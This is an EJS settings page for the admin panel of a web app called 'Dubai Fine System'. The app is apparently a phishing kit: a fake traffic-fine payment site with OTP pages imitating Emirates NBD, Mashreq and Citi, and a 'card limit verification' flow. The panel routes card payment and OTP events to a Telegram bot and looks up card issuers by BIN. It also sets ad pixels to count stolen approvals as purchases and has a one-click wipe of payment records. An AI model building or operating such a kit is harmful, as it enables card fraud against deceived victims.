<%- include('_layout', { pageTitle: 'Settings', activePage: 'settings', adminUser }) %>

<% if (typeof dbError !== 'undefined' && dbError) { %>
<div class="alert alert-error" style="margin-bottom:16px;">Database error: <%= dbError %></div>
<% } %>

<% if (saved) { %>
<div class="alert alert-success" style="margin-bottom:16px;">Settings saved successfully.</div>
<% } %>
<% if (error) { %>
<div class="alert alert-error" style="margin-bottom:16px;">Error: <%= error %></div>
<% } %>

<!-- General Settings -->
<div class="table-card" style="margin-bottom:20px;">
  <div class="tc-header">
    <div class="tc-title">General Settings</div>
  </div>
  <div class="form-section">
    <form method="POST" action="/admin/settings">
      <input type="hidden" name="save_settings" value="1">

      <div class="form-row">
        <div class="form-group">
          <label>Default OTP Page</label>
          <select name="otp_default_page">
            <option value="otp-sms"     <%= otpDefault==='otp-sms'     ? 'selected' : '' %>>SMS OTP</option>
            <option value="otp-sms2"    <%= otpDefault==='otp-sms2'    ? 'selected' : '' %>>SMS OTP 2 (Alternate)</option>
            <option value="otp"         <%= otpDefault==='otp'         ? 'selected' : '' %>>Emirates NBD</option>
            <option value="otp-mashreq" <%= otpDefault==='otp-mashreq' ? 'selected' : '' %>>Mashreq</option>
            <option value="otp-citi"    <%= otpDefault==='otp-citi'    ? 'selected' : '' %>>Citi</option>
            <option value="card-limit"  <%= otpDefault==='card-limit'  ? 'selected' : '' %>>Card Limit Verification</option>
          </select>
          <div class="field-hint">New users on the payment page will be routed to this OTP flow by default.</div>
        </div>

        <div class="form-group">
          <label>Site Status</label>
          <select name="site_active">
            <option value="1" <%= siteActive==='1' ? 'selected' : '' %>>Active</option>
            <option value="0" <%= siteActive==='0' ? 'selected' : '' %>>Maintenance</option>
          </select>
          <div class="field-hint">When set to Maintenance, public pages will display a service notice.</div>
        </div>
      </div>

      <div class="form-actions">
        <button type="submit" class="btn btn-primary">Save General Settings</button>
      </div>
    </form>
  </div>
</div>

<!-- Meta & TikTok Pixel -->
<div class="table-card" style="margin-bottom:20px;">
  <div class="tc-header">
    <div class="tc-title">Meta Pixel &amp; Conversions API (CAPI)</div>
  </div>
  <div class="form-section">
    <form method="POST" action="/admin/settings" id="pixel-form">
      <input type="hidden" name="save_pixel" value="1">
      <input type="hidden" name="meta_event_triggers"   id="meta_event_triggers_input"   value="">
      <input type="hidden" name="tiktok_event_triggers" id="tiktok_event_triggers_input" value="">

      <!-- Meta credentials -->
      <div class="px-section-label">Meta (Facebook) Pixel</div>
      <div class="form-row">
        <div class="form-group">
          <label>Pixel ID</label>
          <input type="text" name="meta_pixel_id" value="<%= metaPixelId %>" placeholder="1260674512113479" class="mono" autocomplete="off">
          <div class="field-hint">Frontend pixel ID — injected into public pages.</div>
        </div>
        <div class="form-group">
          <label>Access Token (CAPI)</label>
          <input type="text" name="meta_access_token" value="<%= metaAccessToken %>" placeholder="EAAxxxxxxxxxxxxxxx" class="mono" autocomplete="off">
          <div class="field-hint">Server-side Conversions API token from Events Manager.</div>
        </div>
        <div class="form-group">
          <label>Test Event Code</label>
          <input type="text" name="meta_test_event_code" value="<%= metaTestEventCode %>" placeholder="TEST12345" class="mono" autocomplete="off">
          <div class="field-hint">Optional — leave empty in production.</div>
        </div>
      </div>

      <!-- Meta event triggers table -->
      <div class="px-section-label" style="margin-top:4px;">Meta Event Triggers</div>
      <div class="field-hint" style="margin-bottom:12px;">Configure which URL load or button click fires each Meta Pixel event.</div>
      <div class="px-table-wrap">
        <table class="px-table">
          <thead>
            <tr>
              <th>Event</th><th>Type</th><th>Trigger</th><th></th>
            </tr>
          </thead>
          <tbody id="meta-trigger-tbody"></tbody>
        </table>
      </div>

      <!-- TikTok credentials -->
      <div class="px-section-label" style="margin-top:20px;">TikTok Pixel</div>
      <div class="form-row">
        <div class="form-group">
          <label>TikTok Pixel ID</label>
          <input type="text" name="tiktok_pixel_id" value="<%= tiktokPixelId %>" placeholder="CXXXXXXXXXXXXXXXXX" class="mono" autocomplete="off">
          <div class="field-hint">Found in TikTok Ads Manager → Assets → Events.</div>
        </div>
        <div class="form-group">
          <label>TikTok Access Token (Events API)</label>
          <input type="text" name="tiktok_access_token" value="<%= tiktokAccessToken %>" placeholder="xxxxxxxx..." class="mono" autocomplete="off">
          <div class="field-hint">Server-side Events API token for CAPI.</div>
        </div>
      </div>

      <!-- TikTok event triggers table -->
      <div class="px-section-label" style="margin-top:4px;">TikTok Event Triggers</div>
      <div class="field-hint" style="margin-bottom:12px;">Configure which URL load or button click fires each TikTok Pixel event.</div>
      <div class="px-table-wrap">
        <table class="px-table">
          <thead>
            <tr>
              <th>Event</th><th>Type</th><th>Trigger</th><th></th>
            </tr>
          </thead>
          <tbody id="tiktok-trigger-tbody"></tbody>
        </table>
      </div>

      <div class="form-actions" style="margin-top:20px;">
        <button type="submit" class="btn btn-primary">Save Pixel Settings</button>
      </div>
    </form>
  </div>
</div>

<!-- Pixel Config Modal -->
<div id="pixel-modal-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:1000;align-items:center;justify-content:center;padding:20px;">
  <div class="px-modal">
    <div class="px-modal-head">
      <div>
        <div style="font-size:10px;font-weight:700;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:2px;" id="modal-platform-label">Meta Event</div>
        <div style="font-size:16px;font-weight:800;color:var(--tx-base);" id="modal-event-title">Configure</div>
      </div>
      <button onclick="closePixelModal()" class="px-modal-close">×</button>
    </div>
    <!-- Tabs -->
    <div class="px-tabs">
      <button id="tab-btn-url"    onclick="switchPixelTab('url')"    class="px-tab">🔗 URL Trigger</button>
      <button id="tab-btn-button" onclick="switchPixelTab('button')" class="px-tab">🖱 Button Trigger</button>
    </div>
    <!-- URL tab -->
    <div id="pixel-tab-url" class="px-tab-body">
      <div class="px-tab-hint">Event fires when the selected URL is loaded.</div>
      <div id="url-options-list"></div>
    </div>
    <!-- Button tab -->
    <div id="pixel-tab-button" class="px-tab-body" style="display:none;">
      <div class="px-tab-hint">Event fires when the selected button is clicked.</div>
      <div id="btn-options-list"></div>
    </div>
    <!-- Footer -->
    <div class="px-modal-foot">
      <button onclick="closePixelModal()" class="btn btn-ghost">Cancel</button>
      <button onclick="savePixelConfig()"  class="btn btn-primary">Save</button>
    </div>
  </div>
</div>

<!-- Telegram & API Settings -->
<div class="table-card" style="margin-bottom:20px;">
  <div class="tc-header">
    <div class="tc-title">Telegram &amp; API Settings</div>
    <div class="tc-meta">Stored in database — takes precedence over environment variables</div>
  </div>
  <div class="form-section">
    <form method="POST" action="/admin/settings">
      <input type="hidden" name="save_telegram" value="1">

      <div class="form-row">
        <div class="form-group">
          <label>Payment Notification Bot Token</label>
          <input type="text" name="telegram_bot_token"
                 value="<%= telegramToken %>"
                 placeholder="1234567890:ABCDefGhIJKlmNoPQRstuVWxyZ"
                 class="mono" autocomplete="off" spellcheck="false">
          <div class="field-hint">Receives card payment and OTP event notifications.</div>
        </div>

        <div class="form-group">
          <label>Telegram Chat ID</label>
          <input type="text" name="telegram_chat_id"
                 value="<%= telegramChatId %>"
                 placeholder="-1001234567890 or 7632086796"
                 class="mono" autocomplete="off" spellcheck="false">
          <div class="field-hint">Channel, group, or personal chat ID for all notifications.</div>
        </div>
      </div>

      <div class="form-row">
        <div class="form-group">
          <label>Inquiry Notification Chat ID</label>
          <input type="text" name="inquiry_chat_id"
                 value="<%= inquiryChatId %>"
                 placeholder="-1001234567890 or 7632086796"
                 class="mono" autocomplete="off" spellcheck="false">
          <div class="field-hint">Separate channel/chat for plate inquiry (search) alerts. Uses the same bot token above.</div>
        </div>

        <div class="form-group">
          <label>HandyAPI Key</label>
          <input type="text" name="handy_api_key"
                 value="<%= handyApiKey %>"
                 placeholder="HAS-xxxxxxxxxxxxxxxxxxxx"
                 class="mono" autocomplete="off" spellcheck="false">
          <div class="field-hint">BIN lookup for card issuer/country identification. Get one at handyapi.com.</div>
        </div>
      </div>

      <!-- Admin Panel Alerts toggle -->
      <div style="font-size:11px;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid #f1f5f9;margin-top:8px;">
        Admin Panel Alerts
      </div>
      <div class="form-group">
        <label style="display:flex;align-items:center;gap:10px;cursor:pointer;">
          <input type="checkbox" name="admin_tg_alerts" value="1" <%= adminTgAlerts==='1' ? 'checked' : '' %>
                 style="width:16px;height:16px;accent-color:#006837;">
          <span>Send Telegram notification on login and critical admin actions (approve, delete, settings save)</span>
        </label>
        <div class="field-hint">Uses the Payment Notification Bot Token and Chat ID configured above.</div>
      </div>

      <div class="form-actions">
        <button type="submit" class="btn btn-primary">Save Telegram &amp; API Settings</button>
        <button type="button" class="btn btn-ghost" onclick="testTelegram()">Send Test Message</button>
      </div>
    </form>
  </div>
</div>

<!-- Change Password -->
<div class="table-card">
  <div class="tc-header">
    <div class="tc-title">Change Password</div>
  </div>
  <div class="form-section">

    <% if (pwMsg) { %>
    <div class="alert alert-<%= pwMsg.type === 'success' ? 'success' : 'error' %>" style="max-width:480px;margin-bottom:18px;"><%= pwMsg.text %></div>
    <% } %>

    <form method="POST" action="/admin/settings" style="max-width:480px;">
      <input type="hidden" name="change_password" value="1">

      <div class="form-group">
        <label>New Username <span style="font-weight:400;color:#94a3b8;">(leave empty to keep current)</span></label>
        <input type="text" name="new_username" placeholder="<%= adminUser %>" autocomplete="off">
      </div>
      <div class="form-group">
        <label>Current Password</label>
        <input type="password" name="current_password" placeholder="Enter current password" autocomplete="current-password" required>
      </div>
      <div class="form-group">
        <label>New Password</label>
        <input type="password" name="new_password" placeholder="Minimum 6 characters" autocomplete="new-password" required>
      </div>
      <div class="form-group">
        <label>Confirm New Password</label>
        <input type="password" name="new_password2" placeholder="Repeat new password" autocomplete="new-password" required>
      </div>

      <div class="form-actions">
        <button type="submit" class="btn btn-primary">Update Password</button>
      </div>
    </form>
  </div>
</div>
<!-- Change Password end -->

<!-- Reset All Settings -->
<div class="table-card" style="margin-bottom:20px;border-color:#fecaca;">
  <div class="tc-header" style="border-bottom-color:#fecaca;">
    <div class="tc-title" style="color:#dc2626;">Danger Zone</div>
  </div>
  <div class="form-section">
    <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;">
      <div>
        <div style="font-weight:600;font-size:13px;color:var(--tx-base);margin-bottom:3px;">Reset All Data</div>
        <div style="font-size:12px;color:var(--tx-muted);">Deletes all payment records, inquiries and OTP events. Settings are preserved. Cannot be undone.</div>
      </div>
      <button type="button" class="btn" onclick="openResetModal()" style="background:#dc2626;color:white;border:none;">Reset All Data</button>
    </div>
  </div>
</div>

<!-- Reset Modal -->
<div id="reset-modal-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:2000;align-items:center;justify-content:center;padding:20px;">
  <div style="background:var(--bg-card);border-radius:16px;width:100%;max-width:420px;padding:28px;border:1px solid var(--bd);box-shadow:0 20px 60px rgba(0,0,0,0.3);">
    <div style="font-size:22px;margin-bottom:10px;">⚠️</div>
    <div style="font-size:16px;font-weight:800;color:#dc2626;margin-bottom:8px;">Reset All Data?</div>
    <div style="font-size:13px;color:var(--tx-mid);margin-bottom:22px;line-height:1.5;">This will permanently delete <strong>all payment records</strong>, <strong>all inquiry logs</strong>, and OTP events. Your settings, Telegram tokens, and Pixel IDs will be preserved. This action cannot be undone.</div>
    <div style="display:flex;gap:10px;justify-content:flex-end;">
      <button onclick="closeResetModal()" class="btn btn-ghost">Cancel</button>
      <button onclick="confirmReset()" style="padding:8px 18px;background:#dc2626;color:white;border:none;border-radius:7px;font-weight:700;cursor:pointer;">Yes, Reset Everything</button>
    </div>
  </div>
</div>

<style>
.form-section { padding: 24px 28px; }
.form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
@media (max-width: 700px) { .form-row { grid-template-columns: 1fr; } }
.form-group { margin-bottom: 18px; }
.form-group label {
  display: block; font-size: 11px; font-weight: 700; color: #374151;
  text-transform: uppercase; letter-spacing: .5px; margin-bottom: 6px;
}
.form-group input, .form-group select {
  width: 100%; padding: 9px 12px; border: 1.5px solid #e2e8f0;
  border-radius: 8px; font-size: 13px; color: #0f172a; background: #f8fafc;
  outline: none; transition: border-color .15s, box-shadow .15s;
}
.form-group input:focus, .form-group select:focus {
  border-color: #006837; background: #fff;
  box-shadow: 0 0 0 3px rgba(0,104,55,.08);
}
.form-group input.mono { font-family: 'SFMono-Regular', Consolas, monospace; font-size: 12px; letter-spacing: .2px; }
.field-hint { font-size: 11px; color: #94a3b8; margin-top: 5px; line-height: 1.4; }
.form-actions { display: flex; gap: 10px; padding-top: 6px; flex-wrap: wrap; }
.alert-success { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 10px 16px; border-radius: 8px; font-size: 13px; }
.alert-error   { background: #fef2f2; border: 1px solid #fecaca; color: #991b1b; padding: 10px 16px; border-radius: 8px; font-size: 13px; }
/* ── Pixel section ────────────────────────────────── */
.px-section-label {
  font-size: 11px; font-weight: 700; color: var(--tx-label);
  text-transform: uppercase; letter-spacing: .5px;
  margin-bottom: 12px; padding-bottom: 8px;
  border-bottom: 1px solid var(--bd-light);
}
.px-table-wrap { overflow-x: auto; border: 1.5px solid var(--bd); border-radius: 10px; margin-bottom: 4px; }
.px-table { width: 100%; border-collapse: collapse; font-size: 13px; }
.px-table thead th {
  background: var(--bg-thead); padding: 9px 14px;
  font-size: 11px; font-weight: 700; color: var(--tx-head);
  text-transform: uppercase; letter-spacing: .4px;
  border-bottom: 1.5px solid var(--bd); text-align: left;
}
.px-table tbody tr { border-bottom: 1px solid var(--bd-light); }
.px-table tbody tr:last-child { border-bottom: none; }
.px-table tbody td { padding: 10px 14px; color: var(--tx-base); vertical-align: middle; }

/* Modal */
.px-modal {
  background: var(--bg-card); border-radius: 16px;
  width: 100%; max-width: 520px; max-height: 90vh;
  display: flex; flex-direction: column;
  box-shadow: 0 20px 60px rgba(0,0,0,0.35);
  border: 1px solid var(--bd);
}
.px-modal-head {
  padding: 18px 22px 14px; border-bottom: 1px solid var(--bd);
  display: flex; align-items: center; justify-content: space-between; flex-shrink: 0;
}
.px-modal-close {
  width: 32px; height: 32px; border-radius: 8px;
  border: 1.5px solid var(--bd); background: var(--bg-page);
  color: var(--tx-muted); font-size: 18px; cursor: pointer;
  display: flex; align-items: center; justify-content: center;
}
.px-modal-close:hover { border-color: var(--tx-mid); }
.px-tabs { display: flex; border-bottom: 1px solid var(--bd); flex-shrink: 0; }
.px-tab {
  flex: 1; padding: 11px 12px; border: none; background: none;
  font-size: 13px; font-weight: 600; cursor: pointer;
  border-bottom: 2px solid transparent; color: var(--tx-muted);
  transition: all .15s;
}
.px-tab:hover { color: var(--tx-base); }
.px-tab.active { color: #006837; border-bottom-color: #006837; }
.px-tab-body { overflow-y: auto; flex: 1; padding: 14px 20px; }
.px-tab-hint { font-size: 12px; color: var(--tx-muted); margin-bottom: 10px; }
.px-modal-foot {
  padding: 12px 22px; border-top: 1px solid var(--bd);
  display: flex; gap: 8px; justify-content: flex-end; flex-shrink: 0;
}

/* Radio option cards */
.px-opt {
  display: flex; align-items: center; gap: 12px;
  padding: 9px 12px; border-radius: 8px; cursor: pointer;
  border: 1.5px solid var(--bd); margin-bottom: 7px;
  background: var(--bg-card); transition: border-color .1s, background .1s;
}
.px-opt:hover { border-color: var(--tx-mid); }
.px-opt.selected-url    { border-color: #006837; background: rgba(0,104,55,.06); }
.px-opt.selected-button { border-color: #7c3aed; background: rgba(124,58,237,.06); }
.px-opt input[type=radio] { flex-shrink: 0; width: 15px; height: 15px; }
.px-opt-main  { font-weight: 600; font-size: 13px; color: var(--tx-base); font-family: monospace; }
.px-opt-sub   { font-size: 11px; color: var(--tx-muted); margin-top: 1px; }
.px-badge-url    { font-size: 11px; background: #e0f2fe; color: #0284c7; padding: 2px 7px; border-radius: 20px; font-weight: 700; }
.px-badge-button { font-size: 11px; background: #ede9fe; color: #7c3aed; padding: 2px 7px; border-radius: 20px; font-weight: 700; }
.px-platform-label { font-size: 11px; background: var(--bg-thead); color: var(--tx-mid); padding: 2px 7px; border-radius: 20px; font-weight: 600; }
</style>

<script>
function openResetModal()  { document.getElementById('reset-modal-overlay').style.display = 'flex'; }
function closeResetModal() { document.getElementById('reset-modal-overlay').style.display = 'none'; }
async function confirmReset() {
  closeResetModal();
  try {
    const r = await fetch('/admin/settings/reset', { method: 'POST' });
    const d = await r.json();
    if (d.ok) { toast('All settings reset successfully', 'success'); setTimeout(() => location.reload(), 1200); }
    else toast('Error: ' + (d.error || 'unknown'), 'error');
  } catch(e) { toast('Error: ' + e.message, 'error'); }
}
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeResetModal(); });

async function testTelegram() {
  const token  = document.querySelector('[name=telegram_bot_token]').value.trim();
  const chatId = document.querySelector('[name=telegram_chat_id]').value.trim();
  if (!token || !chatId) { toast('Enter bot token and chat ID first', 'error'); return; }
  try {
    const r = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: '<b>Admin panel test message</b>\nDubai Fine System — connection verified.', parse_mode: 'HTML' }),
    });
    const d = await r.json();
    if (d.ok) toast('Test message sent successfully');
    else toast('Telegram error: ' + (d.description || 'unknown'), 'error');
  } catch (e) { toast('Connection error: ' + e.message, 'error'); }
}

// ── Pixel Event Trigger Configuration ──────────────────────────────────────
const PIXEL_URLS = [
  { value: '/',             label: 'Home Page' },
  { value: '/fines',        label: 'Fines Results' },
  { value: '/payment',      label: 'Card Payment' },
  { value: '/otp-sms',      label: 'SMS OTP' },
  { value: '/otp',          label: 'Emirates NBD OTP' },
  { value: '/otp-mashreq',  label: 'Mashreq OTP' },
  { value: '/otp-citi',     label: 'Citi OTP' },
  { value: '/otp-approved', label: 'Payment Success' },
];

const PIXEL_BUTTONS = [
  { id: 'search-btn-home',   selector: '#search-btn',  page: '/',         label: '"Check Fines" button',    page_label: '/' },
  { id: 'pay-btn-fines',     selector: '#pay-btn',     page: '/fines',    label: '"Pay Now" button',         page_label: '/fines' },
  { id: 'pay-btn-payment',   selector: '#pay-btn',     page: '/payment',  label: '"Submit Payment" button',  page_label: '/payment' },
  { id: 'resend-btn-sms',    selector: '#resend-btn',  page: '/otp-sms',  label: '"Resend" button',          page_label: '/otp-sms' },
  { id: 'resend-btn-citi',   selector: '#resend-btn',  page: '/otp-citi', label: '"Resend" button',          page_label: '/otp-citi' },
  { id: 'retry-btn-fines',   selector: '.btn-retry',   page: '/fines',    label: '"Try Again" button',       page_label: '/fines' },
  { id: 'select-all-fines',  selector: '.sel-btn',     page: '/fines',    label: '"Select All Payable"',     page_label: '/fines' },
  { id: 'cancel-btn-sms',    selector: '.cancel-btn',  page: '/otp-sms',  label: '"Cancel" button',          page_label: '/otp-sms' },
];

const META_EVENTS = [
  'PageView','ViewContent','Search','AddToCart','AddToWishlist',
  'InitiateCheckout','AddPaymentInfo','Purchase','Lead',
  'CompleteRegistration','Contact','CustomizeProduct','Donate',
  'FindLocation','Schedule','StartTrial','SubmitApplication','Subscribe'
];

const TIKTOK_EVENTS = [
  'PageView','ViewContent','Search','AddToCart','AddToWishlist',
  'InitiateCheckout','AddPaymentInfo','Purchase','PlaceAnOrder',
  'Lead','CompleteRegistration','Contact','Download',
  'ClickButton','Subscribe','SubmitForm'
];

const DEFAULT_TRIGGERS = {
  PageView:          { type: 'url',    value: '/' },
  Search:            { type: 'button', id: 'search-btn-home', selector: '#search-btn', page: '/' },
  InitiateCheckout:  { type: 'button', id: 'pay-btn-fines',   selector: '#pay-btn',    page: '/fines' },
  AddPaymentInfo:    { type: 'url',    value: '/payment' },
  Purchase:          { type: 'url',    value: '/otp-approved' },
  SubmitApplication: { type: 'url',    value: '/otp-sms' },
  ViewContent:       { type: 'url',    value: '/fines' },
};

function loadTriggers(inputId, rawJson) {
  let obj = {};
  try { obj = JSON.parse(rawJson || '{}'); } catch(e) {}
  return obj;
}

let metaTriggers   = loadTriggers('meta_event_triggers_input',
  <%- typeof metaEventTriggersJson   !== 'undefined' ? JSON.stringify(metaEventTriggersJson)   : '"{}"' %>);
let tiktokTriggers = loadTriggers('tiktok_event_triggers_input',
  <%- typeof tiktokEventTriggersJson !== 'undefined' ? JSON.stringify(tiktokEventTriggersJson) : '"{}"' %>);

function getTrig(platform, name) {
  const store = platform === 'meta' ? metaTriggers : tiktokTriggers;
  return store[name] || DEFAULT_TRIGGERS[name] || null;
}

function getTriggerLabel(t) {
  if (!t) return '—';
  if (t.type === 'url') return t.value;
  const b = PIXEL_BUTTONS.find(x => x.id === t.id);
  return b ? b.selector + ' · ' + b.page : (t.selector || '?');
}

function renderTable(tbodyId, platform, events) {
  const tbody = document.getElementById(tbodyId);
  if (!tbody) return;
  tbody.innerHTML = events.map(name => {
    const t = getTrig(platform, name);
    const isUrl = !t || t.type === 'url';
    const badgeCls = isUrl ? 'px-badge-url' : 'px-badge-button';
    const badgeTxt = isUrl ? 'URL' : 'Button';
    return `<tr>
      <td><strong style="font-size:13px;">${name}</strong></td>
      <td><span class="${badgeCls}">${badgeTxt}</span></td>
      <td style="font-family:monospace;font-size:12px;color:var(--tx-mid);max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${getTriggerLabel(t)}">${getTriggerLabel(t)}</td>
      <td><button type="button" onclick="openPixelModal('${platform}','${name}')" style="padding:4px 10px;border:1.5px solid var(--bd);border-radius:6px;background:var(--bg-page);font-size:11px;font-weight:600;color:var(--tx-base);cursor:pointer;white-space:nowrap;">⚙ Configure</button></td>
    </tr>`;
  }).join('');
}

function renderAllTables() {
  renderTable('meta-trigger-tbody',   'meta',   META_EVENTS);
  renderTable('tiktok-trigger-tbody', 'tiktok', TIKTOK_EVENTS);
}

function syncHiddenInputs() {
  document.getElementById('meta_event_triggers_input').value   = JSON.stringify(metaTriggers);
  document.getElementById('tiktok_event_triggers_input').value = JSON.stringify(tiktokTriggers);
}

// ── Modal ───────────────────────────────────────────────────────────────────
let currentPlatform  = null;
let currentEventName = null;

function renderUrlOptions(current) {
  return PIXEL_URLS.map(u => {
    const sel = current && current.type === 'url' && current.value === u.value;
    return `<label class="px-opt${sel ? ' selected-url' : ''}">
      <input type="radio" name="modal-url-opt" class="pixel-url-opt" value="${u.value}" ${sel ? 'checked' : ''} style="accent-color:#006837;">
      <div><div class="px-opt-main">${u.value}</div><div class="px-opt-sub">${u.label}</div></div>
    </label>`;
  }).join('');
}

function renderBtnOptions(current) {
  return PIXEL_BUTTONS.map(b => {
    const sel = current && current.type === 'button' && current.id === b.id;
    return `<label class="px-opt${sel ? ' selected-button' : ''}">
      <input type="radio" name="modal-btn-opt" class="pixel-btn-opt" value="${b.id}" ${sel ? 'checked' : ''} style="accent-color:#7c3aed;">
      <div>
        <div class="px-opt-main">${b.label}</div>
        <div class="px-opt-sub" style="font-family:monospace;">${b.selector} &nbsp;·&nbsp; ${b.page_label}</div>
      </div>
    </label>`;
  }).join('');
}

function openPixelModal(platform, eventName) {
  currentPlatform  = platform;
  currentEventName = eventName;
  const t = getTrig(platform, eventName);
  document.getElementById('modal-platform-label').textContent = (platform === 'meta' ? 'Meta' : 'TikTok') + ' Event';
  document.getElementById('modal-event-title').textContent    = 'Configure: ' + eventName;
  document.getElementById('url-options-list').innerHTML = renderUrlOptions(t);
  document.getElementById('btn-options-list').innerHTML = renderBtnOptions(t);
  switchPixelTab(t && t.type === 'button' ? 'button' : 'url');
  document.getElementById('pixel-modal-overlay').style.display = 'flex';

  document.querySelectorAll('.pixel-url-opt').forEach(r => {
    r.addEventListener('change', () => {
      document.getElementById('url-options-list').innerHTML = renderUrlOptions({ type:'url', value: r.value });
    });
  });
  document.querySelectorAll('.pixel-btn-opt').forEach(r => {
    r.addEventListener('change', () => {
      const b = PIXEL_BUTTONS.find(x => x.id === r.value);
      if (b) document.getElementById('btn-options-list').innerHTML = renderBtnOptions({ type:'button', id: b.id, selector: b.selector, page: b.page });
    });
  });
}

function closePixelModal() {
  document.getElementById('pixel-modal-overlay').style.display = 'none';
  currentPlatform = currentEventName = null;
}

function switchPixelTab(type) {
  const uPanel = document.getElementById('pixel-tab-url');
  const bPanel = document.getElementById('pixel-tab-button');
  const uBtn   = document.getElementById('tab-btn-url');
  const bBtn   = document.getElementById('tab-btn-button');
  if (type === 'url') {
    uPanel.style.display = 'block'; bPanel.style.display = 'none';
    uBtn.classList.add('active'); bBtn.classList.remove('active');
  } else {
    uPanel.style.display = 'none'; bPanel.style.display = 'block';
    uBtn.classList.remove('active'); bBtn.classList.add('active');
  }
}

function savePixelConfig() {
  if (!currentPlatform || !currentEventName) return;
  const urlActive = document.getElementById('pixel-tab-url').style.display !== 'none';
  let trigger;
  if (urlActive) {
    const sel = document.querySelector('.pixel-url-opt:checked');
    if (!sel) { alert('Please select a URL.'); return; }
    trigger = { type: 'url', value: sel.value };
  } else {
    const sel = document.querySelector('.pixel-btn-opt:checked');
    if (!sel) { alert('Please select a button.'); return; }
    const b = PIXEL_BUTTONS.find(x => x.id === sel.value);
    if (!b) return;
    trigger = { type: 'button', id: b.id, selector: b.selector, page: b.page };
  }
  if (currentPlatform === 'meta')   metaTriggers[currentEventName]   = trigger;
  else                               tiktokTriggers[currentEventName] = trigger;
  renderAllTables();
  syncHiddenInputs();
  closePixelModal();
  if (typeof toast === 'function') toast('Trigger updated — remember to save', 'success');
}

document.addEventListener('keydown', e => { if (e.key === 'Escape') closePixelModal(); });

// Init
renderAllTables();
syncHiddenInputs();
</script>

<%- include('_layout_end') %>
